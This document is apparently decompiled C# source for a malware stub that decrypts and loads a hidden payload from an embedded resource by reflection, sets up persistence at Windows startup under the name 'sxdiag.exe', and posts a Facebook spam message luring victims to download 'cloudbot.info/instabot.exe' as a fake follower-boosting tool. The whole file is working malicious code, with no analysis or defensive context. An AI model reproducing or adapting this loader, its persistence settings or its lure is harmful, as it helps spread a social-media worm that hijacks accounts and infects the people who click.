using System;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Text;
using Microsoft.VisualBasic.CompilerServices;

public class Core
{
	public class Engine
	{
		public static Type[] classDictionary;

		public static object dynamicMethodInvoker(string nameOfClass, string nameOfMethod, object[] args)
		{
			try
			{
				Type[] array = classDictionary;
				foreach (Type type in array)
				{
					if (Operators.CompareString(type.FullName, nameOfClass, false) != 0)
					{
						continue;
					}
					MethodInfo[] methods = type.GetMethods();
					foreach (MethodInfo methodInfo in methods)
					{
						if (Operators.CompareString(methodInfo.Name, nameOfMethod, false) == 0)
						{
							return methodInfo.Invoke(RuntimeHelpers.GetObjectValue(Activator.CreateInstance(type)), args);
						}
					}
				}
				object result = default(object);
				return result;
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				Console.WriteLine(nameOfClass + "." + nameOfMethod + Environment.NewLine + Environment.NewLine + ex2.ToString());
				object result = false;
				ProjectData.ClearProjectError();
				return result;
			}
		}

		public static byte[] readResourceInformation(string name)
		{
			try
			{
				Stream manifestResourceStream = Assembly.GetExecutingAssembly().GetManifestResourceStream(name);
				byte[] buffer = new byte[(int)(manifestResourceStream.Length - 1L) + 1];
				int count = manifestResourceStream.Read(buffer, 0, (int)manifestResourceStream.Length);
				MemoryStream memoryStream = new MemoryStream(buffer, 0, count);
				return memoryStream.ToArray();
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				Console.WriteLine("Resource Error: " + ex2.ToString());
				byte[] result = null;
				ProjectData.ClearProjectError();
				return result;
			}
		}

		public static string PDC(string Data, string Key, uint ExtraRounds = 0u)
		{
			byte[] Data2 = Encoding.Default.GetBytes(Data);
			byte[] bytes = PDCB(ref Data2, Encoding.Default.GetBytes(Key), ExtraRounds);
			string @string = Encoding.Default.GetString(bytes);
			bytes = null;
			return @string;
		}

		public static byte[] PDCB(ref byte[] Data, byte[] Key, uint ExtraRounds = 0u)
		{
			int num = (int)((Data.Length - 1) * ((long)ExtraRounds + 1L));
			for (int i = 0; i <= num; i++)
			{
				Data[i % Data.Length] = (byte)(((Data[i % Data.Length] ^ Key[i % Key.Length]) - Data[(i + 1) % Data.Length] + 256) % 256);
			}
			Array.Resize(ref Data, Data.Length - 1);
			return Data;
		}

		public static byte[] decompressPackage(byte[] compressedPackage)
		{
			MemoryStream memoryStream = new MemoryStream();
			memoryStream.Write(compressedPackage, 0, compressedPackage.Length);
			memoryStream.Position = 0L;
			GZipStream gZipStream = new GZipStream(memoryStream, CompressionMode.Decompress, leaveOpen: true);
			MemoryStream memoryStream2 = new MemoryStream();
			byte[] array = new byte[64];
			int num = -1;
			for (num = gZipStream.Read(array, 0, array.Length); num > 0; num = gZipStream.Read(array, 0, array.Length))
			{
				memoryStream2.Write(array, 0, num);
			}
			return memoryStream2.ToArray();
		}
	}

	private const bool START_WITH_WINDOWS = true;

	private const bool TWITTER = false;

	private const bool FACEBOOK = true;

	private const string FILENAME = "sxdiag.exe";

	private const string REGISTRY_ENTRY = "sxdiag";

	private const int DELAY_TIME = 5;

	private const bool RESTART_CYCLE = true;

	private const int RESTART_TIME = 43200000;

	public static string[] facebookMessageList = null;

	public static string[] twitterMessageList = null;

	public static object customLogins;

	public static byte[] coreLib;

	[STAThread]
	public static void Main()
	{
		try
		{
			Console.WriteLine("Started Program...");
			facebookMessageList = new string[1] { "Check out this new facebook and instagram likes and follows program here! I've gotten 200 followers in 10 minutes :D cloudbot.info/instabot.exe" };
			twitterMessageList = new string[1] { "TWITTERMESSAGELIST" };
			try
			{
				coreLib = Encoding.Default.GetBytes(Engine.PDC(Encoding.Default.GetString(Engine.decompressPackage(Engine.readResourceInformation("imgData.resources"))), "PK"));
				Engine.classDictionary = Assembly.Load(coreLib).GetTypes();
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				Console.WriteLine("Decryption Error: " + ex2.ToString());
				ProjectData.ClearProjectError();
			}
			Console.WriteLine("Decrypted HttpLib...");
			if (coreLib != null)
			{
				try
				{
					customLogins = new object[6]
					{
						false,
						RuntimeHelpers.GetObjectValue(Engine.dynamicMethodInvoker("Encryption", "GetData", new object[2] { "", "PrivateSalt" })),
						RuntimeHelpers.GetObjectValue(Engine.dynamicMethodInvoker("Encryption", "GetData", new object[2] { "CUSTOMFACEBOOKPASSWORD", "PrivateSalt" })),
						false,
						RuntimeHelpers.GetObjectValue(Engine.dynamicMethodInvoker("Encryption", "GetData", new object[2] { "CUSTOMTWITTERUSERNAME", "PrivateSalt" })),
						RuntimeHelpers.GetObjectValue(Engine.dynamicMethodInvoker("Encryption", "GetData", new object[2] { "CUSTOMTWITTERPASSWORD", "PrivateSalt" }))
					};
				}
				catch (Exception ex3)
				{
					ProjectData.SetProjectError(ex3);
					Exception ex4 = ex3;
					Console.WriteLine("Custom Logins Error: " + ex4.ToString());
					ProjectData.ClearProjectError();
				}
				Console.WriteLine("Custom Logins Set...");
				try
				{
					Engine.dynamicMethodInvoker("HttpLib.Core", "WaitFor", new object[1] { 5 });
				}
				catch (Exception ex5)
				{
					ProjectData.SetProjectError(ex5);
					Exception ex6 = ex5;
					Console.WriteLine("Delay Error: " + ex6.ToString());
					ProjectData.ClearProjectError();
				}
				Console.WriteLine("Delay Successful...");
				try
				{
					Engine.dynamicMethodInvoker("HttpLib.Core", "Initialize", new object[9]
					{
						true,
						false,
						new object[2] { facebookMessageList, twitterMessageList },
						RuntimeHelpers.GetObjectValue(customLogins),
						true,
						43200000,
						true,
						"sxdiag.exe",
						"sxdiag"
					});
				}
				catch (Exception ex7)
				{
					ProjectData.SetProjectError(ex7);
					Exception ex8 = ex7;
					Console.WriteLine("HttpLib Call Error: " + ex8.ToString());
					ProjectData.ClearProjectError();
				}
				Console.WriteLine("HttpLib Called...");
			}
			else
			{
				Environment.Exit(0);
			}
		}
		catch (Exception ex9)
		{
			ProjectData.SetProjectError(ex9);
			Exception ex10 = ex9;
			Console.WriteLine("HUGE ERROR: " + ex10.ToString());
			ProjectData.ClearProjectError();
		}
		Process.GetCurrentProcess().WaitForExit();
	}
}
